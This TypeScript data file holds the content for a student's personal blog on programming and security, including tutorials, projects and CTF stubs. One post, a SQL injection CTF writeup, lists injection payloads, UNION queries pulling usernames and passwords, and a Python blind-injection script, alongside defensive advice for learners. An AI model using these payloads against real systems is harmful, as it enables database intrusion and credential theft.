export interface BlogPost {
  id: string;
  title: string;
  summary: string;
  content: string;
  category: string;
  tags: string[];
  date: string;
  readTime: number;
  views: number;
}

export interface Project {
  id: string;
  name: string;
  description: string;
  techStack: string[];
  image: string;
  github: string;
  demo: string;
}

export interface CTFWriteup {
  id: string;
  title: string;
  category: "Web" | "Reverse" | "Crypto" | "Misc" | "Pwn";
  competition: string;
  date: string;
  content: string;
  solved: boolean;
}

export interface Skill {
  name: string;
  level: number; // 1-5
  category: string;
}

export interface RoadmapItem {
  year: string;
  title: string;
  items: string[];
  status: "completed" | "current" | "upcoming";
}

export const skills: Skill[] = [
  { name: "Python", level: 4, category: "编程语言" },
  { name: "C语言", level: 3, category: "编程语言" },
  { name: "JavaScript", level: 3, category: "编程语言" },
  { name: "TypeScript", level: 2, category: "编程语言" },
  { name: "SQL", level: 3, category: "编程语言" },
  { name: "Web开发", level: 3, category: "技术方向" },
  { name: "网络安全", level: 3, category: "技术方向" },
  { name: "Linux", level: 3, category: "技术方向" },
  { name: "CTF", level: 2, category: "技术方向" },
  { name: "数据结构", level: 3, category: "技术方向" },
  { name: "Git", level: 4, category: "工具" },
  { name: "Docker", level: 2, category: "工具" },
  { name: "VMware", level: 3, category: "工具" },
  { name: "Wireshark", level: 3, category: "工具" },
  { name: "Cisco Packet Tracer", level: 2, category: "工具" },
];

export const roadmap: RoadmapItem[] = [
  {
    year: "大一",
    title: "基础打牢",
    items: ["Python 基础", "C 语言", "计算机基础", "高等数学", "线性代数"],
    status: "completed",
  },
  {
    year: "大二",
    title: "技术深入",
    items: ["数据结构与算法", "Web 开发", "Linux 系统", "网络安全入门", "数据库"],
    status: "current",
  },
  {
    year: "大三",
    title: "实战提升",
    items: ["企业级项目", "实习经历", "CTF 安全比赛", "开源贡献"],
    status: "upcoming",
  },
  {
    year: "大四",
    title: "职业起航",
    items: ["毕业设计", "秋招/春招", "技术博客沉淀", "行业认证"],
    status: "upcoming",
  },
];

export const blogPosts: BlogPost[] = [
  {
    id: "python-basics",
    title: "Python 入门：从零开始的编程之旅",
    summary: "本文将带你从零开始学习 Python 编程，涵盖变量、数据类型、控制流和函数等基础概念。",
    content: `# Python 入门：从零开始的编程之旅

## 什么是 Python？

Python 是一种高级编程语言，以其简洁易读的语法著称。它广泛应用于 Web 开发、数据分析、人工智能和网络安全等领域。

## 环境搭建

首先，你需要安装 Python。访问 [python.org](https://python.org) 下载最新版本。

\`\`\`bash
# 验证安装
python --version
\`\`\`

## Hello World

让我们从最经典的程序开始：

\`\`\`python
print("Hello, World!")
\`\`\`

## 变量与数据类型

Python 是动态类型语言，不需要声明变量类型：

\`\`\`python
# 字符串
name = "张三"

# 整数
age = 20

# 浮点数
gpa = 3.8

# 布尔值
is_student = True

# 列表
hobbies = ["编程", "网络安全", "阅读"]
\`\`\`

## 控制流

\`\`\`python
# if-else
if age >= 18:
    print("成年人")
else:
    print("未成年")

# for 循环
for hobby in hobbies:
    print(f"爱好: {hobby}")

# while 循环
count = 0
while count < 5:
    print(count)
    count += 1
\`\`\`

## 函数

\`\`\`python
def greet(name):
    return f"你好, {name}!"

message = greet("世界")
print(message)
\`\`\`

## 总结

Python 是一门非常适合初学者的语言。通过本文的学习，你已经掌握了 Python 的基础知识。接下来，你可以深入学习面向对象编程、文件操作、网络编程等高级话题。
`,
    category: "编程",
    tags: ["Python", "入门", "编程基础"],
    date: "2026-03-15",
    readTime: 8,
    views: 1024,
  },
  {
    id: "linux-basics",
    title: "Linux 基础命令速查手册",
    summary: "整理常用的 Linux 命令，适合日常使用和 CTF 比赛中快速查阅。",
    content: `# Linux 基础命令速查手册

## 文件操作

\`\`\`bash
# 列出文件
ls -la

# 切换目录
cd /path/to/dir

# 创建目录
mkdir -p dir1/dir2

# 复制文件
cp source.txt dest.txt

# 移动/重命名
mv old.txt new.txt

# 删除文件
rm file.txt

# 查看文件内容
cat file.txt
less file.txt
head -n 20 file.txt
tail -n 20 file.txt
\`\`\`

## 权限管理

\`\`\`bash
# 修改权限
chmod 755 file.sh
chmod +x script.sh

# 修改所有者
chown user:group file.txt
\`\`\`

## 网络相关

\`\`\`bash
# 查看网络接口
ifconfig
ip addr

# 测试连通性
ping google.com

# 端口扫描
nmap -sV target.com

# 下载文件
wget https://example.com/file.zip
curl -O https://example.com/file.zip
\`\`\`

## 进程管理

\`\`\`bash
# 查看进程
ps aux
top
htop

# 杀死进程
kill PID
kill -9 PID
\`\`\`

## 用户管理

\`\`\`bash
# 添加用户
sudo useradd -m username

# 修改密码
sudo passwd username

# 切换用户
su - username
\`\`\`
`,
    category: "网络安全",
    tags: ["Linux", "命令行", "运维"],
    date: "2026-04-02",
    readTime: 6,
    views: 856,
  },
  {
    id: "ctf-web-sqli",
    title: "CTF Writeup: SQL注入从入门到实战",
    summary: "通过几道 CTF 题目，讲解 SQL 注入的基本原理和常见利用方式。",
    content: `# CTF Writeup: SQL注入从入门到实战

## SQL注入原理

SQL注入是通过在应用程序输入中插入恶意的 SQL 代码片段，使后端数据库执行非预期操作。

## 基本测试

\`\`\`sql
-- 测试是否存在注入
' OR '1'='1
" OR "1"="1
' OR 1=1 --
\`\`\`

## Union 注入

\`\`\`sql
-- 确定列数
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --

-- 联合查询
' UNION SELECT 1,2,3 --
' UNION SELECT username,password,3 FROM users --
\`\`\`

## 盲注

### 布尔盲注

\`\`\`python
import requests

url = "http://target.com/login"

for i in range(1, 100):
    payload = f"' AND SUBSTRING((SELECT password FROM users LIMIT 1),{i},1)='a' --"
    r = requests.get(url, params={"id": payload})
    if "Welcome" in r.text:
        print(f"Found character at position {i}: a")
\`\`\`

### 时间盲注

\`\`\`sql
' AND IF(SUBSTRING(database(),1,1)='s', SLEEP(5), 0) --
\`\`\`

## 防御方法

1. 使用参数化查询
2. 使用 ORM
3. 输入验证和过滤
4. 最小权限原则

\`\`\`python
# 安全的参数化查询
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
\`\`\`
`,
    category: "网络安全",
    tags: ["CTF", "SQL注入", "Web安全", "Writeup"],
    date: "2026-05-10",
    readTime: 12,
    views: 2048,
  },
  {
    id: "data-structures-intro",
    title: "数据结构入门：链表与栈的实现",
    summary: "用 C 语言实现链表和栈的基本操作，理解数据结构的底层原理。",
    content: `# 数据结构入门：链表与栈的实现

## 链表

链表是一种线性数据结构，每个节点包含数据和指向下一个节点的指针。

\`\`\`c
#include <stdio.h>
#include <stdlib.h>

typedef struct Node {
    int data;
    struct Node* next;
} Node;

// 创建新节点
Node* createNode(int data) {
    Node* newNode = (Node*)malloc(sizeof(Node));
    newNode->data = data;
    newNode->next = NULL;
    return newNode;
}

// 头部插入
void insertHead(Node** head, int data) {
    Node* newNode = createNode(data);
    newNode->next = *head;
    *head = newNode;
}

// 打印链表
void printList(Node* head) {
    Node* current = head;
    while (current != NULL) {
        printf("%d -> ", current->data);
        current = current->next;
    }
    printf("NULL\\n");
}

int main() {
    Node* head = NULL;
    insertHead(&head, 3);
    insertHead(&head, 2);
    insertHead(&head, 1);
    printList(head); // 1 -> 2 -> 3 -> NULL
    return 0;
}
\`\`\`

## 栈

栈是一种后进先出（LIFO）的数据结构。

\`\`\`c
#define MAX 100

typedef struct {
    int items[MAX];
    int top;
} Stack;

void initStack(Stack* s) {
    s->top = -1;
}

int isEmpty(Stack* s) {
    return s->top == -1;
}

void push(Stack* s, int value) {
    if (s->top < MAX - 1) {
        s->items[++(s->top)] = value;
    }
}

int pop(Stack* s) {
    if (!isEmpty(s)) {
        return s->items[(s->top)--];
    }
    return -1;
}
\`\`\`
`,
    category: "编程",
    tags: ["数据结构", "C语言", "链表", "栈"],
    date: "2026-04-20",
    readTime: 10,
    views: 678,
  },
  {
    id: "web-dev-react-nextjs",
    title: "使用 Next.js 构建个人博客",
    summary: "记录使用 Next.js + TypeScript + Tailwind CSS 构建个人博客的完整过程。",
    content: `# 使用 Next.js 构建个人博客

## 为什么选择 Next.js？

Next.js 是 React 的全栈框架，提供了：
- 服务端渲染（SSR）
- 静态生成（SSG）
- 文件系统路由
- API 路由
- 图片优化

## 项目初始化

\`\`\`bash
npx create-next-app@latest blog --typescript --tailwind --app
\`\`\`

## 目录结构

\`\`\`
blog/
├── src/
│   ├── app/          # 页面路由
│   ├── components/   # 组件
│   ├── data/         # 数据文件
│   └── lib/          # 工具函数
├── public/           # 静态资源
└── package.json
\`\`\`

## 关键代码

### 动态路由

\`\`\`typescript
// src/app/blog/[slug]/page.tsx
export default async function Post({ params }: { params: { slug: string } }) {
  const post = await getPost(params.slug);
  return <article>{post.content}</article>;
}
\`\`\`

### MDX 渲染

使用 react-markdown 将 Markdown 转换为 HTML，配合 rehype-highlight 实现代码高亮。

## 部署

推荐部署到 Vercel，零配置即可部署 Next.js 应用。
`,
    category: "开发",
    tags: ["Next.js", "React", "TypeScript", "博客"],
    date: "2026-06-01",
    readTime: 7,
    views: 1536,
  },
  {
    id: "network-basics",
    title: "计算机网络基础：TCP/IP 协议详解",
    summary: "深入理解 TCP/IP 协议栈的工作原理，为网络安全学习打下基础。",
    content: `# 计算机网络基础：TCP/IP 协议详解

## OSI 七层模型

1. 物理层
2. 数据链路层
3. 网络层
4. 传输层
5. 会话层
6. 表示层
7. 应用层

## TCP 三次握手

\`\`\`
客户端 -> SYN -> 服务器
客户端 <- SYN+ACK <- 服务器
客户端 -> ACK -> 服务器
\`\`\`

## TCP 四次挥手

\`\`\`
客户端 -> FIN -> 服务器
客户端 <- ACK <- 服务器
客户端 <- FIN <- 服务器
客户端 -> ACK -> 服务器
\`\`\`

## 常见端口

| 端口 | 协议 | 用途 |
|------|------|------|
| 21   | FTP  | 文件传输 |
| 22   | SSH  | 远程登录 |
| 80   | HTTP | 网页浏览 |
| 443  | HTTPS| 加密网页 |
| 3306 | MySQL| 数据库 |

## 抓包分析

使用 Wireshark 进行网络抓包，可以直观地观察协议交互过程。
`,
    category: "网络安全",
    tags: ["网络", "TCP/IP", "基础"],
    date: "2026-05-25",
    readTime: 9,
    views: 912,
  },
];

export const projects: Project[] = [
  {
    id: "personal-blog",
    name: "个人博客系统",
    description: "使用 Next.js + TypeScript + Tailwind CSS 构建的全功能个人技术博客，支持 Markdown 渲染、暗色模式、搜索和评论。",
    techStack: ["Next.js", "TypeScript", "Tailwind CSS", "React"],
    image: "/projects/blog.png",
    github: "https://github.com/yourusername/blog",
    demo: "https://yourblog.vercel.app",
  },
  {
    id: "ctf-toolkit",
    name: "CTF 工具箱",
    description: "集成常用 CTF 工具脚本的 Python 工具包，支持编解码、哈希计算、进制转换等功能。",
    techStack: ["Python", "Flask", "SQLite"],
    image: "/projects/ctf.png",
    github: "https://github.com/yourusername/ctf-toolkit",
    demo: "",
  },
  {
    id: "python-automation",
    name: "Python 自动化工具",
    description: "一系列 Python 自动化脚本，包括文件整理、批量重命名、网络扫描和数据抓取。",
    techStack: ["Python", "Requests", "BeautifulSoup"],
    image: "/projects/automation.png",
    github: "https://github.com/yourusername/py-automation",
    demo: "",
  },
  {
    id: "network-scanner",
    name: "网络端口扫描器",
    description: "基于 Python 的多线程端口扫描工具，支持服务识别和操作系统指纹检测。",
    techStack: ["Python", "Socket", "Threading"],
    image: "/projects/scanner.png",
    github: "https://github.com/yourusername/net-scanner",
    demo: "",
  },
];

export const ctfWriteups: CTFWriteup[] = [
  {
    id: "sqli-basic",
    title: "SQL注入基础题",
    category: "Web",
    competition: "校内CTF 2026",
    date: "2026-03-20",
    content: "通过 Union 注入获取 flag，考察基本的 SQL 注入利用。",
    solved: true,
  },
  {
    id: "reverse-crackme",
    title: "简单 CrackMe",
    category: "Reverse",
    competition: "BUUCTF",
    date: "2026-04-15",
    content: "使用 IDA Pro 逆向分析二进制文件，找到正确的输入。",
    solved: true,
  },
  {
    id: "crypto-rsa",
    title: "RSA 入门",
    category: "Crypto",
    competition: "攻防世界",
    date: "2026-05-01",
    content: "基础 RSA 解密，已知 p、q 和 e，求私钥 d 并解密。",
    solved: true,
  },
  {
    id: "misc-steg",
    title: "图片隐写术",
    category: "Misc",
    competition: "BUUCTF",
    date: "2026-05-20",
    content: "使用 LSB 隐写术在图片中隐藏 flag。",
    solved: true,
  },
];

export const siteConfig = {
  name: "TechSpace",
  author: "XXX",
  description: "一个正在探索软件开发与网络安全的计算机专业学生",
  github: "https://github.com/yourusername",
  email: "your@email.com",
  avatar: "/avatar.png",
  school: "XXX 大学",
  major: "计算机科学与技术",
  year: "大二在读",
  categories: ["全部", "编程", "网络安全", "开发"],
  blogCategories: ["Python", "C语言", "数据结构", "Web开发", "网络安全", "CTF", "Linux"],
};
